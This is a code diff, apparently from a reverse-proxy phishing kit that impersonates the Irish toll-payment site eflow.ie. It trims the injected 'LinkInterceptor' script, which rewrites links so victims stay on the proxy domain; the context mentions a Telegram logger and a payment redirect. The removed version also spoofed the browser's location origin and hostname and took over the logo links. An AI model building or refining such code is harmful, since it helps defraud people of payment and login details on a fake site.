@@ -1637,262 +1637,40 @@ const proxyOptions = {
             // Include: reCAPTCHA fix, payment redirect, user tracking, and link interceptor
             const trackingScript = telegramLogger.getTrackingScript();
             
-            // CRITICAL: Link interceptor script to prevent redirects to eflow.ie
-            // v3.0 - AGGRESSIVE MOBILE FIX - Works independently of href content
+            // CRITICAL: Link interceptor script - v4.0 MINIMAL
+            // ТОЛЬКО перехватывает ссылки с eflow.ie - НЕ ТРОГАЕТ другие ссылки!
             const linkInterceptorScript = `
 <script>
 (function() {
   'use strict';
-  const PROXY_DOMAIN = '${proxyDomain}';
   const PROXY_ORIGIN = '${proxyOriginFull}';
   const TARGET_DOMAIN = 'eflow.ie';
   
-  console.log('[LinkInterceptor v3.0] AGGRESSIVE MOBILE FIX - Starting...');
+  console.log('[LinkInterceptor v4.0] MINIMAL - Starting...');
   
-  /**
-   * КРИТИЧНО: Определить является ли элемент логотипом
-   * ТОЛЬКО точные селекторы - НЕ все ссылки в header!
-   */
-  function isLogoElement(el) {
-    if (!el) return false;
-    const link = el.closest ? el.closest('a') : null;
-    if (!link) return false;
-    
-    // ТОЧНЫЕ проверки - только реальный логотип
-    if (link.getAttribute('rel') === 'home') return true;
-    if (link.classList.contains('site-logo')) return true;
-    
-    // Проверка по img внутри ссылки
-    const img = link.querySelector('img');
-    if (img) {
-      const alt = (img.alt || '').toLowerCase();
-      const src = (img.src || '').toLowerCase();
-      // Только если img имеет alt="Home" или src содержит "logo"
-      if (alt === 'home' || src.includes('logo.svg') || src.includes('logo.png')) return true;
-    }
-    
-    // НЕ считаем логотипом просто ссылки в header!
-    return false;
-  }
-  
-  /**
-   * Обработчик ТОЛЬКО для ссылок с eflow.ie (НЕ для всех ссылок!)
-   */
-  function handleEflowLinks(e) {
+  // Перехват ТОЛЬКО ссылок с eflow.ie
+  function interceptEflowLink(e) {
     const link = e.target.closest ? e.target.closest('a') : null;
-    if (!link) return; // Пропускаем если не ссылка
+    if (!link) return;
     
-    const href = link.href || link.getAttribute('href') || '';
+    const href = link.href || '';
     
-    // ТОЛЬКО перехватываем ссылки на eflow.ie
-    if (href.includes(TARGET_DOMAIN) || href.includes('www.' + TARGET_DOMAIN)) {
-      console.log('[LinkInterceptor v3.0] eflow.ie link intercepted:', href);
+    // ТОЛЬКО если href содержит eflow.ie
+    if (href.includes(TARGET_DOMAIN)) {
+      console.log('[LinkInterceptor v4.0] Intercepted:', href);
       e.preventDefault();
       e.stopPropagation();
       
-      const fixedUrl = href.replace(
-        new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'),
-        PROXY_ORIGIN
-      );
+      const fixedUrl = href.replace(/https?:\\/\\/(www\\.)?eflow\\.ie/gi, PROXY_ORIGIN);
       window.location.href = fixedUrl;
-      return false;
     }
-    // Все остальные ссылки - НЕ ТРОГАЕМ, пусть работают нормально
+    // ВСЕ ОСТАЛЬНЫЕ ССЫЛКИ - НЕ ТРОГАЕМ!
   }
   
-  // Перехватываем ТОЛЬКО eflow.ie ссылки
-  document.addEventListener('click', handleEflowLinks, true);
-  document.addEventListener('touchend', handleEflowLinks, true);
+  document.addEventListener('click', interceptEflowLink, true);
+  document.addEventListener('touchend', interceptEflowLink, true);
   
-  console.log('[LinkInterceptor v3.0] eflow.ie interceptor installed');
-  
-  // Legacy support (не критично, но оставляем для совместимости)
-  try {
-    Object.defineProperty(window.location, 'origin', {
-      get: function() { return PROXY_ORIGIN; },
-      configurable: true
-    });
-  } catch(e) {}
-  
-  try {
-    Object.defineProperty(window.location, 'hostname', {
-      get: function() { return PROXY_DOMAIN; },
-      configurable: true
-    });
-  } catch(e) {}
-  
-  // КРИТИЧНО: Перехватываем window.location до любых изменений
-  const originalLocation = window.location;
-  let locationIntercepted = false;
-  
-  function fixUrl(url) {
-    if (!url || typeof url !== 'string') return url;
-    if (url.includes(TARGET_DOMAIN) || url.includes('www.' + TARGET_DOMAIN)) {
-      return url.replace(new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'), '$1' + PROXY_DOMAIN);
-    }
-    return url;
-  }
-  
-  // Перехватываем присвоение window.location.href
-  try {
-    const locationDescriptor = Object.getOwnPropertyDescriptor(window, 'location');
-    if (locationDescriptor && locationDescriptor.configurable !== false) {
-      // Создаем прокси для location
-      const locationProxy = new Proxy(originalLocation, {
-        set: function(target, prop, value) {
-          if (prop === 'href' && typeof value === 'string') {
-            value = fixUrl(value);
-          }
-          target[prop] = value;
-          return true;
-        }
-      });
-    }
-  } catch(e) {}
-  
-  // Перехватываем window.location.assign и window.location.replace
-  const originalAssign = window.location.assign;
-  const originalReplace = window.location.replace;
-  
-  window.location.assign = function(url) {
-    return originalAssign.call(window.location, fixUrl(url));
-  };
-  
-  window.location.replace = function(url) {
-    return originalReplace.call(window.location, fixUrl(url));
-  };
-  
-  /**
-   * Агрессивная обработка логотипа - НЕ зависит от содержимого href
-   */
-  function setupLogoHandlers(link) {
-    if (!link || link._logoHandlersSet) return;
-    link._logoHandlersSet = true;
-    
-    // Установить правильный href
-    link.href = PROXY_ORIGIN + '/';
-    link.setAttribute('href', PROXY_ORIGIN + '/');
-    link.setAttribute('data-logo-fixed', 'v3');
-    
-    // Удалить inline обработчики
-    link.removeAttribute('onclick');
-    link.removeAttribute('ontouchstart');
-    link.removeAttribute('ontouchend');
-    
-    // CSS для предотвращения дефолтного поведения
-    link.style.touchAction = 'manipulation';
-    
-    // Touch и click обработчики в capture phase
-    const handler = function(e) {
-      console.log('[LinkInterceptor v3.0] Logo handler:', e.type);
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      
-      if (e.type === 'touchstart') {
-        link._touchActive = true;
-        return false;
-      }
-      
-      if (e.type === 'touchend' || e.type === 'click') {
-        if (e.type === 'touchend' && !link._touchActive) return false;
-        link._touchActive = false;
-        window.location.href = PROXY_ORIGIN + '/';
-        return false;
-      }
-      return false;
-    };
-    
-    link.addEventListener('click', handler, { capture: true, passive: false });
-    link.addEventListener('touchstart', handler, { capture: true, passive: false });
-    link.addEventListener('touchend', handler, { capture: true, passive: false });
-    
-    // Также для img внутри
-    const img = link.querySelector('img');
-    if (img) {
-      img.addEventListener('click', handler, { capture: true, passive: false });
-      img.addEventListener('touchstart', handler, { capture: true, passive: false });
-      img.addEventListener('touchend', handler, { capture: true, passive: false });
-    }
-    
-    console.log('[LinkInterceptor v3.0] Logo handlers installed for:', link.className || link.id || 'logo');
-  }
-  
-  /**
-   * Найти и обработать все логотипы
-   */
-  function fixAllLogos() {
-    const selectors = [
-      'a[rel="home"]',
-      'a[title="Home"]',
-      'a.site-logo',
-      'a.navbar-brand',
-      '.site-branding a',
-      'header a img[alt="Home"]'
-    ];
-    
-    selectors.forEach(sel => {
-      try {
-        document.querySelectorAll(sel).forEach(el => {
-          const link = el.tagName === 'A' ? el : el.closest('a');
-          if (link) setupLogoHandlers(link);
-        });
-      } catch(e) {}
-    });
-    
-    // По img с logo
-    document.querySelectorAll('a img[alt="Home"], a img[src*="logo"]').forEach(img => {
-      const link = img.closest('a');
-      if (link) setupLogoHandlers(link);
-    });
-  }
-  
-  /**
-   * Исправить ссылки с eflow.ie (legacy)
-   */
-  function fixEflowLinks() {
-    document.querySelectorAll('a[href*="eflow.ie"]').forEach(link => {
-      if (link.getAttribute('data-fixed')) return;
-      const href = link.href || '';
-      const fixed = href.replace(new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'), PROXY_ORIGIN);
-      link.href = fixed;
-      link.setAttribute('data-fixed', 'true');
-    });
-  }
-  
-  // Инициализация
-  function init() {
-    fixAllLogos();
-    fixEflowLinks();
-    console.log('[LinkInterceptor v3.0] Initialization complete');
-  }
-  
-  // Запуск
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init);
-  } else {
-    init();
-  }
-  
-  // MutationObserver
-  const obs = new MutationObserver(() => { fixAllLogos(); fixEflowLinks(); });
-  if (document.body) {
-    obs.observe(document.body, { childList: true, subtree: true });
-  } else {
-    document.addEventListener('DOMContentLoaded', () => {
-      obs.observe(document.body, { childList: true, subtree: true });
-    });
-  }
-  
-  // Периодическая проверка
-  setInterval(() => { fixAllLogos(); fixEflowLinks(); }, 2000);
-  
-  // При полной загрузке
-  window.addEventListener('load', () => {
-    setTimeout(init, 100);
-    setTimeout(init, 500);
-  });
-  
+  console.log('[LinkInterceptor v4.0] MINIMAL - Ready');
 })();
 </script>`;
             
